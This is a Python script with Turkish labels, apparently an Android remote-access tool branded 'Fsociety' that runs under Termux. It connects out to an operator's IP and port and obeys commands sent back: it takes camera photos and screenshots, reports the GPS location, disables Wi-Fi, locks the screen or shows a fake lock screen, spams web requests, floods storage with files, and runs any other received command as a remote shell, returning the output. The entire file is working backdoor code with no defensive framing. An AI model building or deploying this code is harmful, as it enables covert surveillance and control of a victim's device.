import socket
import os
import datetime
import random
import time

sunucu_ip = input("Sunucu IP >> ")
port = int(input("Port >> "))

log_file = "log.txt"
fsociety_path = "/sdcard/Fsociety"
bildirim_sayisi = 0

s = socket.socket()
s.connect((sunucu_ip, port))
print(f"[+] Bağlandı: {sunucu_ip}:{port}")

def log_yaz(komut):
    zaman = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a") as f:
        f.write(f"[{zaman}] {komut}\n")

def spam_istek(adet):
    if adet > 1000:
        return "[X] En fazla 1000 istek atabilirsin."
    for _ in range(adet):
        os.system("curl -s https://httpbin.org/get > /dev/null")
    return f"[✓] {adet} istek gönderildi."

def dosya_olustur(adet):
    if adet > 100:
        return "[X] En fazla 100 dosya oluşturabilirsin."
    os.makedirs(fsociety_path, exist_ok=True)
    for i in range(1, adet + 1):
        uzanti = random.choice(["txt", "log", "json"])
        with open(f"{fsociety_path}/dosya_{i}.{uzanti}", "w") as f:
            f.write("Fsociety tarafından oluşturuldu.\n")
    return f"[✓] {adet} dosya oluşturuldu."

while True:
    try:
        komut = s.recv(1024).decode().strip()
        log_yaz(komut)

        if komut == "exit":
            s.send("[✓] Bağlantı kapatıldı.".encode())
            break

        elif komut.startswith("spam-istek"):
            try:
                adet = int(komut.split(" ")[1])
                sonuc = spam_istek(adet)
                s.send(sonuc.encode())
            except:
                s.send("[X] Sayı hatalı.".encode())

        elif komut.startswith("olustur-dosya"):
            try:
                adet = int(komut.split(" ")[1])
                sonuc = dosya_olustur(adet)
                s.send(sonuc.encode())
            except:
                s.send("[X] Sayı hatalı.".encode())

        elif komut.startswith("youtube "):
            link = komut.split(" ", 1)[1]
            os.system(f"am start -a android.intent.action.VIEW -d '{link}'")
            s.send("[✓] YouTube bağlantısı açıldı.".encode())

        elif komut.startswith("google "):
            arama = komut.split(" ", 1)[1]
            link = f"https://www.google.com/search?q={arama.replace(' ', '+')}"
            os.system(f'am start -a android.intent.action.VIEW -d "{link}"')
            s.send("[✓] Google araması açıldı.".encode())

        elif komut == "wifi-off":
            sonuc = os.system("svc wifi disable")
            if sonuc != 0:
                os.system("am start -a android.settings.WIFI_SETTINGS")
                time.sleep(1)
                os.system("input tap 200 300")
                s.send("[✓] Root yok, WiFi ayarı açıldı ve otomatik kapatıldı.".encode())
            else:
                s.send("[✓] WiFi kapatıldı.".encode())

        elif komut.startswith("google-kapat "):
            arama = komut.split(" ", 1)[1]
            link = f"https://www.google.com/search?q={arama.replace(' ', '+')}"
            os.system(f'am start -a android.intent.action.VIEW -d "{link}"')
            time.sleep(1)
            sonuc = os.system("svc wifi disable")
            if sonuc != 0:
                os.system("am start -a android.settings.WIFI_SETTINGS")
                time.sleep(1)
                os.system("input tap 200 300")
                s.send("[✓] Google arandı, WiFi otomatik kapatıldı.".encode())
            else:
                s.send("[✓] Google arandı ve WiFi kapatıldı.".encode())

        elif komut.startswith("sound "):
            os.system("termux-media-player play /sdcard/Music/*.mp3")
            s.send("[✓] Müzik çalınıyor.".encode())

        elif komut.startswith("bildirim "):
            try:
                parcalar = komut.split("\"")
                baslik = parcalar[1]
                icerik = parcalar[3]
                os.system(f'termux-notification -t "{baslik}" -c "{icerik}"')
                bildirim_sayisi += 1
                s.send("[✓] Bildirim gönderildi.".encode())
            except:
                s.send("[X] Bildirim hatalı.".encode())

        elif komut == "bildirim-say":
            s.send(f"[✓] Toplam {bildirim_sayisi} bildirim gönderildi.".encode())

        elif komut == "kilit":
            os.system("input keyevent 26")
            s.send("[✓] Ekran kapatıldı.".encode())

        elif komut == "kamera":
            os.system("termux-camera-photo -c 1 /sdcard/DCIM/kamera_fsociety.jpg")
            s.send("[✓] Kamera görüntüsü alındı.".encode())

        elif komut == "konum":
            konum = os.popen("termux-location").read()
            s.send(konum.encode() if konum else "[X] Konum alınamadı.".encode())

        elif komut == "ekran-al":
            os.system("screencap -p /sdcard/Pictures/ekran_fsociety.png")
            s.send("[✓] Ekran görüntüsü alındı.".encode())

        elif komut == "fake-kilit":
            os.system('am start -a android.intent.action.MAIN -n com.termux/.HomeActivity')
            os.system("input keyevent 26")
            s.send("[✓] Fake kilit ekranı etkinleştirildi.".encode())

        else:
            cikti = os.popen(komut).read()
            s.send(cikti.encode() if cikti else "[✓] Komut çalıştı.".encode())

    except Exception as e:
        try:
            s.send(f"[X] Hata: {str(e)}".encode())
        except:
            break
